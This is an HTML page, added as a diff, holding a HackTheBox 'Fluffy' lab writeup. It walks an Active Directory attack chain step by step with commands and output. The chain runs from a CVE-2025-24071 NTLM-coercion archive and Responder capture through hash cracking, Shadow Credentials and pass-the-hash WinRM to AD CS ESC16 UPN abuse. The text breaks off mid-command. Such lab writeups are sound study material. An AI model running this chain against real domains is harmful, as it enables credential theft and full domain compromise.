@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description"
+    content="HTB Fluffy Writeup - Full Active Directory attack chain: writable SMB share, CVE-2025-24071 NetNTLMv2 capture, hash cracking, Service Accounts abuse, Shadow Credentials, AD CS ESC16, and Administrator WinRM.">
+  <link rel="canonical" href="https://abdelaaziz0.github.io/writeups/fluffy.html">
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://abdelaaziz0.github.io/writeups/fluffy.html">
+  <meta property="og:title" content="Fluffy - HTB Writeup">
+  <meta property="og:description" content="HTB Fluffy Writeup - Full Active Directory attack chain: writable SMB share, CVE-2025-24071 NetNTLMv2 capture, hash cracking, Service Accounts abuse, Shadow Credentials, AD CS ESC16, and Administrator WinRM.">
+  <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Fluffy - HTB Writeup">
+  <meta name="twitter:description" content="HTB Fluffy Writeup - Full Active Directory attack chain: writable SMB share, CVE-2025-24071 NetNTLMv2 capture, hash cracking, Service Accounts abuse, Shadow Credentials, AD CS ESC16, and Administrator WinRM.">
+  <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <title>Fluffy - HTB Writeup</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=DM+Serif+Display&family=DM+Sans:wght@300;400;500&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/writeup.css"></head>
+
+<body>
+
+  <header>
+  <nav>
+    <a class="nav-logo" href="../index.html">AB_</a>
+    <ul class="nav-links">
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><a href="../cv.pdf" download>CV</a></li>
+    </ul>
+  </nav>
+</header>
+
+  <div class="wrapper">
+
+    <div class="back-row">
+      <a class="back-link" href="../writeups.html">← Retour aux analyses</a>
+    </div>
+
+    <div class="hero">
+      <span class="hero-category">HackTheBox - Active Directory</span>
+      <h1>Fluffy</h1>
+      <p class="hero-sub">
+        A Windows Active Directory chain built from a writable IT share, a patch notice pointing at
+        CVE-2025-24071, NetNTLMv2 capture and cracking, group self-management abuse, Shadow Credentials,
+        WinRM access as a service account, and an AD CS ESC16 path to Administrator.
+      </p>
+      <div class="hero-meta">
+        <span class="tag tag-date">2026-05-12</span>
+        <span class="tag tag-cat">Active Directory</span>
+        <span class="tag tag-cat">Windows</span>
+        <span class="tag tag-cat">AD CS</span>
+        <span class="tag tag-hard">Medium</span>
+        <span class="tag tag-win">Windows Domain Controller</span>
+      </div>
+      <div class="stats-row">
+        <div class="stat"><span class="stat-val">6</span><span class="stat-label">Primitives</span></div>
+        <div class="stat"><span class="stat-val">1</span><span class="stat-label">DC</span></div>
+        <div class="stat"><span class="stat-val">ESC16</span><span class="stat-label">AD CS</span></div>
+        <div class="stat"><span class="stat-val">+7h</span><span class="stat-label">Clock Skew</span></div>
+      </div>
+    </div>
+
+    <div class="toc">
+      <div class="toc-title">Table of Contents</div>
+      <ol>
+        <li><a href="#s1">Environment &amp; Scope</a></li>
+        <li><a href="#s2">Initial Enumeration</a></li>
+        <li><a href="#s3">Writable IT Share</a></li>
+        <li><a href="#s4">Patch Notice &amp; CVE Selection</a></li>
+        <li><a href="#s5">CVE-2025-24071 Payload</a></li>
+        <li><a href="#s6">Responder Capture</a></li>
+        <li><a href="#s7">Cracking p.agila</a></li>
+        <li><a href="#s8">LDAP Enumeration</a></li>
+        <li><a href="#s9">Shadow Credentials to winrm_svc</a></li>
+        <li><a href="#s10">WinRM as winrm_svc and User Flag</a></li>
+        <li><a href="#s11">Post-User: ca_svc Shadow Credentials</a></li>
+        <li><a href="#s12">AD CS ESC16 to Administrator</a></li>
+        <li><a href="#s13">Root Flag</a></li>
+        <li><a href="#s14">Full Attack Chain</a></li>
+        <li><a href="#s15">Key Takeaways</a></li>
+      </ol>
+    </div>
+
+    <section id="s1">
+      <span class="section-number">01 - Environment &amp; Scope</span>
+      <h2>Environment &amp; Scope</h2>
+
+      <p>Fluffy exposes a single Windows Domain Controller externally. The provided credential
+        <code>j.fleischman:[redacted]</code> is not a shell by itself, but it is enough to enumerate
+        SMB shares and write to the <code>IT</code> share. That share is the opening. It contains a PDF
+        warning the IT department about several 2025 vulnerabilities, and one of them gives us a way
+        to coerce a second domain user into authenticating to our SMB listener.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Host</th>
+              <th>IP</th>
+              <th>Role</th>
+              <th>Notes</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Kali / Exegol</td>
+              <td><code>10.10.14.241</code></td>
+              <td>Attack box</td>
+              <td>VPN interface <code>tun0</code></td>
+            </tr>
+            <tr>
+              <td>DC01</td>
+              <td><code>10.129.31.202</code></td>
+              <td>Domain Controller</td>
+              <td><code>fluffy.htb</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout">
+        <span class="callout-label">Clock Skew</span>
+        Nmap showed the DC clock was exactly seven hours ahead of the attacker machine. Kerberos
+        operations failed with <code>KRB_AP_ERR_SKEW</code> until the process was executed in a
+        <code>faketime</code> shell aligned to the DC time.
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Account</th>
+              <th>Secret</th>
+              <th>Type</th>
+              <th>How Obtained</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>j.fleischman</code></td>
+              <td><code>[redacted]</code></td>
+              <td>Plaintext</td>
+              <td>Given credential</td>
+            </tr>
+            <tr>
+              <td><code>p.agila</code></td>
+              <td><code>[redacted]</code></td>
+              <td>Plaintext</td>
+              <td>NetNTLMv2 capture cracked with hashcat</td>
+            </tr>
+            <tr>
+              <td><code>winrm_svc</code></td>
+              <td><code>[redacted]</code></td>
+              <td>NT hash</td>
+              <td>Shadow Credentials and PKINIT</td>
+            </tr>
+            <tr>
+              <td><code>ca_svc</code></td>
+              <td><code>[redacted]</code></td>
+              <td>NT hash</td>
+              <td>Shadow Credentials from <code>winrm_svc</code></td>
+            </tr>
+            <tr>
+              <td><code>Administrator</code></td>
+              <td><code>[redacted]</code></td>
+              <td>NT hash</td>
+              <td>AD CS ESC16 UPN mapping abuse</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="s2">
+      <span class="section-number">02 - Reconnaissance</span>
+      <h2>Initial Enumeration</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        The service layout is a classic AD DC: DNS, Kerberos, LDAP, LDAPS, SMB, Global Catalog,
+        WinRM, and AD Web Services. SMB signing was required, so relay was not the path. Kerberos
+        clock skew also appeared immediately in the scan output.
+      </div>
+
+      <pre><code>nmap -sS -A -p- -oN full-scan 10.129.31.202
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp  open  ldap          Microsoft Windows Global Catalog
+3269/tcp  open  ssl/ldap      Microsoft Windows Global Catalog SSL
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+
+Host: DC01
+Domain: fluffy.htb
+SMB signing: enabled and required
+Clock skew: +6h59m59s</code></pre>
+
+      <p>Three immediate signals: this is the Domain Controller, SMB relay is off the table (signing required),
+        and anything Kerberos-based will need time correction (KDC is seven hours ahead).</p>
+
+      <pre><code>echo "10.129.31.202 DC01.fluffy.htb fluffy.htb FLUFFY" >> /etc/hosts</code></pre>
+    </section>
+
+    <section id="s3">
+      <span class="section-number">03 - SMB Enumeration</span>
+      <h2>Writable IT Share</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        The initial credential had no administrative SMB access, but it had read and write access
+        to the <code>IT</code> share. A writable share on a DC is always suspicious - any file placed
+        there can be consumed by another user or automated process.
+      </div>
+
+      <pre><code>smbmap -H "10.129.31.202" -u "j.fleischman" -p '[redacted]'
+
+<span class="good">[+] IP: 10.129.31.202:445 Name: fluffy.htb Status: Authenticated</span>
+Disk       Permissions   Comment
+ADMIN$     NO ACCESS     Remote Admin
+C$         NO ACCESS     Default share
+IPC$       READ ONLY     Remote IPC
+IT         READ, WRITE
+NETLOGON   READ ONLY     Logon server share
+SYSVOL     READ ONLY     Logon server share</code></pre>
+
+      <pre><code>smbclient //10.129.31.202/IT -U 'fluffy.htb/j.fleischman%[redacted]'
+
+smb: \> ls
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025</code></pre>
+
+      <p>An internal software staging area. The important file is <code>Upgrade_Notice.pdf</code> - the
+        binaries are common admin tools and the PDF explicitly instructs the IT department to schedule upgrades
+        for recently disclosed 2025 vulnerabilities.</p>
+    </section>
+
+    <section id="s4">
+      <span class="section-number">04 - Intelligence from the PDF</span>
+      <h2>Patch Notice &amp; CVE Selection</h2>
+
+      <p>The PDF is not flavor text. It tells us which vulnerability family is relevant and, since the share
+        is writable, raises the question: can we place a crafted file that coerces authentication from whoever
+        processes it?</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>CVE ID</th>
+              <th>Severity</th>
+              <th>Usage</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>CVE-2025-24071</code></td>
+              <td>Critical</td>
+              <td><strong>Used</strong> - crafted archive coerces SMB authentication</td>
+            </tr>
+            <tr>
+              <td><code>CVE-2025-24996</code></td>
+              <td>Critical</td>
+              <td>Listed, not used in this path</td>
+            </tr>
+            <tr>
+              <td><code>CVE-2025-46785</code></td>
+              <td>High</td>
+              <td>Listed, not used in this path</td>
+            </tr>
+            <tr>
+              <td><code>CVE-2025-29968</code></td>
+              <td>High</td>
+              <td>Listed, not used in this path</td>
+            </tr>
+            <tr>
+              <td><code>CVE-2025-21193</code></td>
+              <td>Medium</td>
+              <td>Listed, not used in this path</td>
+            </tr>
+            <tr>
+              <td><code>CVE-2025-3445</code></td>
+              <td>Low</td>
+              <td>Listed, not used in this path</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout">
+        <span class="callout-label">Why CVE-2025-24071</span>
+        No code execution needed on the target - only a crafted file that triggers outbound SMB authentication
+        when processed (indexed, rendered, scanned). Perfect for a writable internal share touched by other users.
+      </div>
+    </section>
+
+    <section id="s5">
+      <span class="section-number">05 - Payload Creation</span>
+      <h2>CVE-2025-24071 Payload</h2>
+
+      <div class="theory">
+        <span class="theory-label">Comment fonctionne CVE-2025-24071</span>
+        <p>Les fichiers <code>.library-ms</code> sont des descripteurs XML utilisés par l'Explorateur Windows
+          pour définir des bibliothèques virtuelles (Documents, Musique…). Ils contiennent des balises
+          <code>&lt;url&gt;</code> qui pointent vers des emplacements de stockage - locaux ou réseau.
+        </p>
+        <p>La vulnérabilité réside dans la façon dont Windows Shell parse ces fichiers : lors de
+          l'<strong>extraction d'une archive ZIP</strong> contenant un <code>.library-ms</code>, l'explorateur
+          résout automatiquement les URLs déclarées pour découvrir le contenu de la bibliothèque.
+          Si l'URL pointe vers un chemin UNC (<code>\\attacker\share</code>), Windows initie
+          une connexion SMB vers l'attaquant et envoie un challenge-response NetNTLMv2 - <em>sans que
+            l'utilisateur ouvre le fichier</em>. La simple extraction suffit.</p>
+        <p>La chaîne de déclenchement complète :</p>
+        <div class="theory-diagram">utilisateur (ou service) extrait exploit.zip
+          └─▶ Windows Shell parse fluffy.ms-library
+          └─▶ résolution de &lt;url&gt;\\10.10.14.241\share
+          └─▶ connexion SMB sortante vers l'attaquant
+          └─▶ NetNTLMv2 capturé par Responder</div>
+      </div>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        Writable share + CVE-2025-24071 listed as critical. Generate a malicious archive pointing back to
+        our attacker SMB listener, upload it to the <code>IT</code> share.
+      </div>
+
+      <pre><code>python3 poc.py
+
+Enter your file name: fluffy.ms-library
+Enter IP (EX: 192.168.1.162): 10.10.14.241
+<span class="good">completed</span></code></pre>
+
+      <pre><code>smbclient //10.129.31.202/IT \
+  -U 'fluffy.htb/j.fleischman%[redacted]' \
+  -c 'put exploit.zip'
+
+<span class="good">putting file exploit.zip as \exploit.zip</span></code></pre>
+    </section>
+
+    <section id="s6">
+      <span class="section-number">06 - Credential Capture</span>
+      <h2>Responder Capture</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        After uploading the crafted archive, Responder waited on <code>tun0</code>. The target connected
+        back over SMB and leaked a NetNTLMv2 challenge-response for <code>FLUFFY\p.agila</code>.
+      </div>
+
+      <pre><code>responder -I tun0 -dwv
+
+[+] Poisoners: LLMNR [ON], NBT-NS [ON], MDNS [ON], DNS [ON], DHCP [ON]
+[+] Servers: HTTP [ON], SMB [ON], LDAP [ON], WinRM [ON], MSSQL [ON], DNS [ON]
+[+] Responder NIC: tun0
+[+] Responder IP: 10.10.14.241
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.31.202
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+<span class="good">[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:&lt;challenge&gt;:[redacted NetNTLMv2 hash]</span></code></pre>
+
+      <p>Multiple captures arrived for the same user. One is enough for offline cracking. Save the full
+        hash line to a file for hashcat.</p>
+    </section>
+
+    <section id="s7">
+      <span class="section-number">07 - Password Recovery</span>
+      <h2>Cracking p.agila</h2>
+
+      <p>NetNTLMv2 uses hashcat mode <code>5600</code>.</p>
+
+      <pre><code>hashcat -m 5600 agila.hash /usr/share/wordlists/rockyou.txt
+
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Recovered........: 1/1 (100.00%)
+Speed.#1.........: 3627.6 kH/s</code></pre>
+
+      <div class="callout">
+        <span class="callout-label">Recovered credential</span>
+        Password cracked from rockyou.txt. We now have a second domain account: <code>FLUFFY\p.agila</code>.
+      </div>
+    </section>
+
+    <section id="s8">
+      <span class="section-number">08 - AD Enumeration</span>
+      <h2>LDAP Enumeration</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        <code>p.agila</code> belonged to <code>Service Account Managers</code>, a group with enough
+        control to add members to <code>Service Accounts</code>. That relationship became the bridge
+        to Shadow Credentials.
+      </div>
+
+      <figure style="margin: 1.6rem 0;">
+        <img src="img/bloodhound-fluffy.png" alt="BloodHound graph - p.agila attack path"
+          style="width:100%; border-radius:6px; border:1px solid rgba(255,255,255,.08);">
+        <figcaption style="margin-top:.6rem; font-size:.8rem; opacity:.6; font-style:italic;">
+          BloodHound - graphe des relations depuis <code>p.agila</code>.
+          La lecture du graphe donne l'intégralité du chemin :
+          <code>p.agila</code> est membre de <code>Service Account Managers</code>, qui a
+          <code>GenericAll</code> sur <code>Service Accounts</code>.
+          <code>Service Accounts</code> a <code>GenericWrite</code> sur
+          <code>winrm_svc</code> et <code>ca_svc</code> (Shadow Credentials).
+          <code>winrm_svc</code> est membre de <code>Remote Management Users</code> (WinRM).
+          <code>ca_svc</code> est membre de <code>Cert Publishers</code> (enrôlement AD CS).
+        </figcaption>
+      </figure>
+
+      <pre><code>bloodyAD --host 10.129.31.202 -d fluffy.htb \
+  -u 'p.agila' -p '[redacted]' \
+  get object winrm_svc
+
+distinguishedName: CN=winrm service,CN=Users,DC=fluffy,DC=htb
+displayName: winrm service
+memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
+         CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb
+sAMAccountName: winrm_svc
+servicePrincipalName: WINRM/winrm.fluffy.htb
+userPrincipalName: winrm_svc@fluffy.htb
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD</code></pre>
+
+      <p>Two attributes matter: <code>winrm_svc</code> is a service account in <code>Remote Management Users</code>.
+        If we obtain its hash, WinRM gives us a user shell. A password reset attempt failed - the path is
+        certificate-based takeover instead.</p>
+
+      <div class="theory">
+        <span class="theory-label">GenericWrite &amp; self-membership - pourquoi ça fonctionne</span>
+        <p>Dans Active Directory, les ACL d'un objet groupe peuvent accorder le droit
+          <code>Self-Membership</code> (ou plus généralement <code>GenericWrite</code>) à un autre groupe.
+          Ici, les membres de <code>Service Account Managers</code> ont <code>Self-Membership</code> sur
+          <code>Service Accounts</code> : chaque membre peut s'ajouter lui-même au groupe cible sans
+          droits d'administration.
+        </p>
+        <p>La conséquence en cascade :</p>
+        <ul>
+          <li><code>Service Account Managers</code> → droit <code>Self-Membership</code> sur
+            <code>Service Accounts</code>
+          </li>
+          <li><code>Service Accounts</code> → droit <code>GenericWrite</code> sur les objets compte de service
+            (<code>winrm_svc</code>, <code>ca_svc</code>)</li>
+          <li><code>GenericWrite</code> sur un compte → écriture de l'attribut <code>msDS-KeyCredentialLink</code> →
+            Shadow Credentials</li>
+        </ul>
+        <p><code>GenericWrite</code> ne permet pas d'écrire directement <code>unicodePwd</code> (le hash NT),
+          mais il donne accès à suffisamment d'attributs pour compromettre le compte autrement, via
+          l'ajout d'un credential de clé publique ou la modification du SPN.</p>
+        <div class="theory-diagram">p.agila
+          ∈ Service Account Managers
+          │ Self-Membership
+          ▼
+          Service Accounts ──(p.agila s'y ajoute)──▶ p.agila ∈ Service Accounts
+          │ GenericWrite sur objets du groupe
+          ▼
+          winrm_svc / ca_svc
+          │ msDS-KeyCredentialLink writable
+          ▼
+          Shadow Credentials → NT hash</div>
+      </div>
+    </section>
+
+    <section id="s9">
+      <span class="section-number">09 - Account Takeover</span>
+      <h2>Shadow Credentials to winrm_svc</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        <code>p.agila</code> could add itself to <code>Service Accounts</code>. Shadow Credentials
+        required that group membership first - the initial write attempt failed with insufficient rights
+        until the group was joined.
+      </div>
+
+      <div class="theory">
+        <span class="theory-label">Shadow Credentials - mécanisme</span>
+        <p>L'attribut <code>msDS-KeyCredentialLink</code> a été introduit pour Windows Hello for Business
+          et le Device Trust model. Il stocke des <em>Key Credentials</em> : des structures contenant une
+          clé publique RSA et des métadonnées (device ID, date de création…). Quand un compte possède
+          une entrée dans cet attribut, le KDC accepte une authentification PKINIT utilisant la clé
+          privée correspondante - <strong>en lieu et place du mot de passe</strong>.</p>
+        <p>Si on dispose d'un droit d'écriture sur <code>msDS-KeyCredentialLink</code> d'un compte cible :</p>
+        <ul>
+          <li>On génère une paire de clés RSA (Certipy s'en charge)</li>
+          <li>On écrit la clé publique dans <code>msDS-KeyCredentialLink</code> du compte cible</li>
+          <li>On s'authentifie via PKINIT avec la clé privée → le KDC valide la clé publique stockée et émet un TGT</li>
+          <li>Le TGT contient un PAC chiffré incluant des données que Certipy utilise via
+            <code>U2U (User-to-User)</code> pour récupérer le hash NT - sans jamais toucher au mot de passe du compte
+          </li>
+        </ul>
+        <p>L'opération est <strong>réversible et furtive</strong> : l'entrée peut être supprimée après usage,
+          le mot de passe du compte n'a pas changé, et aucun événement de changement de mot de passe n'est
+          journalisé.</p>
+        <div class="theory-diagram">Attaquant (possède GenericWrite sur winrm_svc)
+          │
+          ├─ génère keypair (pub/priv)
+          ├─ écrit pub → msDS-KeyCredentialLink de winrm_svc
+          │
+          └─▶ certipy auth -pfx winrm_svc.pfx
+          │ PKINIT AS-REQ (signé avec clé privée)
+          ▼
+          KDC vérifie la clé publique dans msDS-KeyCredentialLink
+          │ TGT émis
+          ▼
+          certipy U2U → récupère NT hash de winrm_svc
+          │
+          └─▶ Pass-the-Hash → WinRM</div>
+        <p style="margin-top:.7rem;font-size:.85em;opacity:.75;">
+          Prérequis côté DC : le domaine doit être au niveau fonctionnel 2016+ et les DC doivent
+          supporter PKINIT. Pratiquement universel sur les infrastructures modernes.
+        </p>
+      </div>
+
+      <h3>Step 1 - Add p.agila to Service Accounts</h3>
+
+      <pre><code>bloodyAD --host 10.129.31.202 -d fluffy.htb \
+  -u 'p.agila' -p '[redacted]' \
+  add groupMember "Service Accounts" p.agila
+
+<span class="good">[+] p.agila added to Service Accounts</span></code></pre>
+
+      <h3>Step 2 - Write Shadow Credential on winrm_svc</h3>
+
+      <pre><code>certipy shadow add \
+  -u 'p.agila@fluffy.htb' -p '[redacted]' \
+  -account 'winrm_svc' \
+  -dc-ip 10.129.31.202 \
+  -dc-host DC01.fluffy.htb \
+  -target DC01.fluffy.htb \
+  -target-ip 10.129.31.202 \
+  -out winrm_svc
+
+<span class="good">[*] Successfully added Key Credential with device ID 'e82407fe...'</span>
+<span class="good">[*] Saved certificate and private key to 'winrm_svc'</span></code></pre>
+
+      <div class="callout">
+        <span class="callout-label">Clock skew - faketime shell required</span>
+        The <code>auto</code> mode reached PKINIT but failed with <code>KRB_AP_ERR_SKEW</code>. The
+        fix was to split the operation: write the Shadow Credential with <code>shadow add</code>,
+        open a <code>faketime</code> shell adjusted to the DC time, then run <code>certipy auth</code>
+        from inside it.
+        <br><br>
+        <code>faketime "$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" zsh</code>
+      </div>
+
+      <h3>Step 3 - Authenticate with the PFX (in faketime shell)</h3>
+
+      <pre><code>certipy auth \
+  -pfx winrm_svc \
+  -username winrm_svc \
+  -domain fluffy.htb \
+  -dc-ip 10.129.31.202
+
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+<span class="good">[*] Got TGT</span>
+<span class="good">[*] Got hash for 'winrm_svc@fluffy.htb': [redacted]</span></code></pre>
+
+      <p>The certificate had no embedded identity, but Certipy used the supplied principal. PKINIT
+        succeeded and the NT hash was recovered via the resulting Kerberos material.</p>
+    </section>
+
+    <section id="s10">
+      <span class="section-number">10 - User Access</span>
+      <h2>WinRM as winrm_svc and User Flag</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        <code>winrm_svc</code> was in <code>Remote Management Users</code>. NT hash in hand -
+        Pass-the-Hash to WinRM is the direct route.
+      </div>
+
+      <pre><code>evil-winrm-py -i 10.129.31.202 \
+  -u "winrm_svc" \
+  -H [redacted]
+
+<span class="good">[*] Connecting to '10.129.31.202:5985' as 'winrm_svc'</span>
+
+PS C:\Users\winrm_svc\Desktop> type user.txt
+<span class="good">[redacted]</span></code></pre>
+
+      <div class="pwned-badge">
+        <div class="pwned-dot"></div>
+        User Flag Captured - CVE-2025-24071 → NetNTLMv2 → p.agila → Shadow Credentials → winrm_svc
+      </div>
+    </section>
+
+    <section id="s11">
+      <span class="section-number">11 - Post-User Pivot</span>
+      <h2>Shadow Credentials to ca_svc</h2>
+
+      <p>The next target was <code>ca_svc</code>, a certificate authority service account. CA service
+        accounts often have enrollment permissions that make AD CS abuse possible. LDAP shows it is
+        a member of <code>Cert Publishers</code> and has an existing <code>userCertificate</code> attribute.</p>
+
+      <div class="callout">
+        <span class="callout-label">Tool note - NT hash authentication</span>
+        Certipy uses <code>-hashes</code> for NT hash auth. Passing <code>:hash</code> with <code>-p</code>
+        treats it as a literal password and fails with <code>invalidCredentials</code>.
+      </div>
+
+      <pre><code>certipy shadow add \
+  -u 'winrm_svc@fluffy.htb' -hashes ':[redacted]' \
+  -account 'ca_svc' \
+  -dc-ip 10.129.31.202 \
+  -dc-host DC01.fluffy.htb \
+  -target DC01.fluffy.htb \
+  -target-ip 10.129.31.202 \
+  -out ca_svc
+
+<span class="good">[*] Successfully added Key Credential with device ID '8cdc1fdf...'</span>
+<span class="good">[*] Saved certificate and private key to 'ca_svc'</span></code></pre>
+
+      <pre><code>certipy auth \
+  -pfx ca_svc \
+  -username ca_svc \
+  -domain fluffy.htb \
+  -dc-ip 10.129.31.202
+
+[*] Using principal: 'ca_svc@fluffy.htb'
+<span class="good">[*] Got TGT</span>
+<span class="good">[*] Got hash for 'ca_svc@fluffy.htb': [redacted]</span></code></pre>
+    </section>
+
+    <section id="s12">
+      <span class="section-number">12 - Privilege Escalation</span>
+      <h2>AD CS ESC16 to Administrator</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        Certipy found <code>ESC16</code>: the CA security extension is disabled. Without the object SID
+        extension, certificates are not strongly bound to an AD object. With write access to <code>ca_svc</code>'s
+        UPN, we can temporarily impersonate Administrator and request a certificate under that identity.
+      </div>
+
+      <div class="theory">
+        <span class="theory-label">AD CS ESC16 - l'extension de sécurité et son absence</span>
+
+        <p>Depuis une mise à jour de mai 2022 (KB5014754), les DC Windows embarquent dans chaque certificat
+          émis une extension propriétaire Microsoft identifiée par l'OID
+          <code>1.3.6.1.4.1.311.25.2</code> (<code>szOID_NTDS_CA_SECURITY_EXT</code>). Cette extension
+          contient le <strong>SID de l'objet AD</strong> qui a effectué la demande de certificat.
+        </p>
+
+        <p>Lors de l'authentification PKINIT avec ce certificat, le KDC utilise le SID embarqué pour
+          identifier le compte - et non la valeur du SAN UPN (<code>Subject Alternative Name</code>).
+          Changer l'UPN d'un compte avant la demande de certificat ne sert donc à rien si l'extension
+          est active : le SID réel de <code>ca_svc</code> sera toujours présent dans le certificat,
+          et le KDC mappera vers <code>ca_svc</code>, pas vers Administrator.</p>
+
+        <p><strong>ESC16 : la CA a désactivé cette extension.</strong> Le certificat émis ne contient
+          pas de SID. Le KDC tombe en repli sur le mapping UPN : il résout le SAN UPN du certificat
+          contre l'annuaire AD pour trouver le compte correspondant. Si l'UPN du certificat vaut
+          <code>administrator</code>, le KDC cherche un objet dont l'UPN est <code>administrator</code>
+          et l'authentifie comme tel.
+        </p>
+
+        <p>Les conditions nécessaires pour exploiter ESC16 :</p>
+        <ul>
+          <li>L'extension <code>szOID_NTDS_CA_SECURITY_EXT</code> est désactivée sur la CA</li>
+          <li>On contrôle un compte ayant le droit d'<strong>enrôlement</strong> sur un template accessible
+            (ici <code>Cert Publishers</code> peut enrôler sur le template <code>User</code>)</li>
+          <li>On dispose d'un droit d'<strong>écriture sur l'UPN</strong> (<code>userPrincipalName</code>)
+            du compte enrôleur - ici <code>winrm_svc</code> a <code>GenericWrite</code> sur <code>ca_svc</code></li>
+        </ul>
+
+        <div class="theory-diagram">État normal (extension active)
+          ┌────────────────────────────────────────────────────────┐
+          │ Certificat émis contient : │
+          │ SAN UPN : administrator │
+          │ SID ext : S-1-5-21-...-1103 (SID réel de ca_svc) │
+          │ │
+          │ KDC utilise le SID → authentifie ca_svc [blocked] │
+          └────────────────────────────────────────────────────────┘
+
+          ESC16 (extension désactivée)
+          ┌────────────────────────────────────────────────────────┐
+          │ Certificat émis contient : │
+          │ SAN UPN : administrator │
+          │ SID ext : (absente) │
+          │ │
+          │ KDC cherche UPN = administrator → authentifie Admin [ok] │
+          └────────────────────────────────────────────────────────┘
+
+          Flux d'attaque
+          ① winrm_svc écrit UPN de ca_svc → "administrator"
+          ② ca_svc enrôle un certificat User
+          → CA émet cert(SAN UPN=administrator, pas de SID)
+          ③ winrm_svc restaure l'UPN de ca_svc → "ca_svc@fluffy.htb"
+          ④ certipy auth administrator.pfx
+          → PKINIT → KDC mappe sur Administrator
+          → TGT Administrator + NT hash</div>
+
+        <p style="margin-top:.7rem;font-size:.85em;opacity:.75;">
+          La restauration de l'UPN (étape ③) est critique : la laisser à <code>administrator</code>
+          casserait l'authentification de <code>ca_svc</code> dans l'annuaire et créerait un conflit
+          d'UPN visible dans les logs.
+        </p>
+      </div>
+
+      <h3>Step 1 - Confirm ESC16</h3>
+
+      <pre><code>certipy find \
+  -u 'ca_svc@fluffy.htb' -hashes ':[redacted]' \
+  -dc-ip 10.129.31.202 \
+  -target DC01.fluffy.htb \
+  -vulnerable -enabled -stdout
+
+Certificate Authorities
+  0
+    CA Name                         : fluffy-DC01-CA
+    DNS Name                        : DC01.fluffy.htb
+    Disabled Extensions             : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Enroll                        : FLUFFY.HTB\Cert Publishers
+                                      FLUFFY.HTB\Administrators
+    [!] Vulnerabilities
+      ESC16                         : Security Extension is disabled.</code></pre>
+
+      <h3>Step 2 - Change ca_svc UPN to administrator</h3>
+
+      <pre><code>certipy account update \
+  -u 'winrm_svc@fluffy.htb' -hashes ':[redacted]' \
+  -user 'ca_svc' \
+  -upn 'administrator' \
+  -dc-ip 10.129.31.202 \
+  -dc-host DC01.fluffy.htb \
+  -target DC01.fluffy.htb \
+  -target-ip 10.129.31.202
+
+[*] Updating user 'ca_svc':
+    userPrincipalName : administrator
+<span class="good">[*] Successfully updated 'ca_svc'</span></code></pre>
+
+      <h3>Step 3 - Request certificate as ca_svc (UPN = administrator)</h3>
+
+      <pre><code>certipy req \
+  -u 'ca_svc@fluffy.htb' -hashes ':[redacted]' \
+  -dc-ip 10.129.31.202 \
+  -target DC01.fluffy.htb \
+  -target-ip 10.129.31.202 \
